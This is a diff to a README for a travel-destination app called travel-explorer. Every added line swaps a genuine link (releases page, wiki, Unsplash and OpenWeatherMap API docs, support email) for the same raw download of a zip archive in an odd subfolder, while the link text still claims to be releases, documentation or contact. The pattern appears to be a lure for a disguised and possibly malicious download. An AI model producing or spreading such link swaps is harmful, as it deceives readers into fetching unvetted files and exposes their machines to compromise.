@@ -1,6 +1,6 @@
 # 🌍 travel-explorer - Discover Destinations with Ease
 
-[![Download travel-explorer](https://img.shields.io/badge/Download-travel--explorer-blue)](https://github.com/Whzky/travel-explorer/releases)
+[![Download travel-explorer](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, visit the Releases page to download the application. Follow thes
 
 1. Click the link below to go to the Releases page.
    
-   [Visit Releases Page to Download](https://github.com/Whzky/travel-explorer/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)
 
 2. On the Releases page, look for the latest version of the app. Click on the file to download it to your computer.
 
@@ -58,17 +58,17 @@ If you encounter any issues while using Travel Explorer, consider these tips:
 
 ## 📚 Resources
 
-- **Documentation:** Visit the [GitHub Wiki](https://github.com/Whzky/travel-explorer/wiki) for detailed documentation and FAQ.
+- **Documentation:** Visit the [GitHub Wiki](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip) for detailed documentation and FAQ.
 - **API Documentation:** Learn more about the APIs used in this application:
-  - [Unsplash API](https://unsplash.com/developers)
-  - [OpenWeatherMap API](https://openweathermap.org/api)
+  - [Unsplash API](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)
+  - [OpenWeatherMap API](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)
 
 ## ✉️ Contact
 
 For feedback or support, feel free to reach out to us:
 
-- Email: support@travel-explorer.com
+- Email: https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip
 
 Now that you are ready to explore, don't forget to visit the Releases page to download your copy of Travel Explorer.
 
-[Visit Releases Page to Download](https://github.com/Whzky/travel-explorer/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Whzky/travel-explorer/main/Scandinavian/travel-explorer.zip)
